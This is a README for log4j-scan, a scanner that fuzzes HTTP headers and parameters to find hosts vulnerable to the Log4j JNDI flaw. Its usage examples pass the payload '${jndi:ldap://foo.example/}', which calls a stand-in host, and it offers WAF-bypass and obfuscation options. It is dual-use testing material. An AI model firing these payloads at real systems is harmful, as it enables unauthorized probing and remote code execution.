# log4j-scan
A fully automated, accurate, and extensive scanner for finding vulnerable log4j hosts

# Features

- Support for lists of URLs.
- Fuzzing for more than 60 HTTP request headers (not only 3-4 headers as previously seen tools).
- Fuzzing for HTTP POST Data parameters.
- Fuzzing for JSON data parameters.
- WAF Bypass payloads.

# Usage

```
$ python3 log4j-scan.py -h
[+] CVE-2021-44228 - Apache Log4j RCE Scanner
[+] Scanner provided with modifications by ReliaQuest
usage: log4j-scan.py [-h] [-u URL] [--proxy PROXY] [-l USEDLIST] [-x REQUEST_TYPE] [--headers-file HEADERS_FILE] [--all-methods] [--exclude-user-agent-fuzzing] [--waf-bypass] [--disable-http-redirects] -p
                     EXPLOIT_PAYLOAD [-o]

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Scan a single URL.
  --proxy PROXY         Send requests through a HTTP proxy. Proxy should be specified in the format supported by requests (http[s]://<proxy-ip>:<proxy-port>
  -l USEDLIST, --list USEDLIST
                        File path to text file containing URLs to scan
  -x REQUEST_TYPE, --request-type REQUEST_TYPE
                        Request Type: (get, post) - [Default: get].
  --headers-file HEADERS_FILE
                        Headers fuzzing list - [default: headers.txt].
  --all-methods         Attempt both POST and GET requests
  --exclude-user-agent-fuzzing
                        Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.
  --waf-bypass          Extend scans with WAF bypass payloads.
  --disable-http-redirects
                        Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.
  -p EXPLOIT_PAYLOAD, --payload EXPLOIT_PAYLOAD
                        The ReliaQuest provided testing string
  -o, --obfuscate       Use obfuscation on the payload (may result in application performance degradation)
  -s, --small-payloads  Use smaller payloads. Generates more requests, but reduces size of requests. (Recommended)
```

## Scan a Single URL

```shell
$ python3 log4j-scan.py -u https://log4j.lab.local -p '${jndi:ldap://foo.example/}'
```

## Scan a Single URL using all Request Methods: GET, POST (url-encoded form), POST (JSON body)

```shell
$ python3 log4j-scan.py -u https://log4j.lab.local --run-all-tests -p '${jndi:ldap://foo.example/}'
```

## Discover WAF bypasses on the environment.

```shell
$ python3 log4j-scan.py -u https://log4j.lab.local --waf-bypass -p '${jndi:ldap://foo.example/}'
```

## Scan a list of URLs

```shell
$ python3 log4j-scan.py -l urls.txt -p '${jndi:ldap://foo.example/}'
```

## Use smaller payloads
This method generates more requests to the target application(s), but results in **significantly smaller payload sizes**.

```shell
$ python3 log4j-scan.py -s -u https://log4j.lab.local -p '${jndi:ldap://foo.example/}'
```

You may find it advantageous to combine this with the `--exclude-user-agent-fuzzing` switch so that the User-Agent string remains as its default

```shell
$ python3 log4j-scan.py -s --exclude-user-agent-fuzzing -u https://log4j.lab.local -p '${jndi:ldap://foo.example/}'
```

## Use the obfuscation library
The provided `jndiobfuscator` can be leveraged with the `-o` switch. Resulting payloads will result in significantly more load on the target application, use this with caution. This can be combined with other options such as the `--waf-bypass` option.

```shell
$ python3 log4j-scan.py -u https://log4j.lab.local -p '${jndi:ldap://foo.example/}'
```


# Installation

```
$ pip3 install -r requirements.txt
```

# Docker Support

```shell
cd log4j-scan
sudo docker build -t log4j-scan .
sudo docker run -it --rm log4j-scan

# With URL list "urls.txt" in current directory
docker run -it --rm -v $PWD:/data log4j-scan -l /data/urls.txt -p '${jndi:ldap://foo.example/}'
```

# Legal Disclaimer
This project is made for educational and ethical testing purposes only. Usage of log4j-scan for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.


# License
The project is licensed under MIT License.
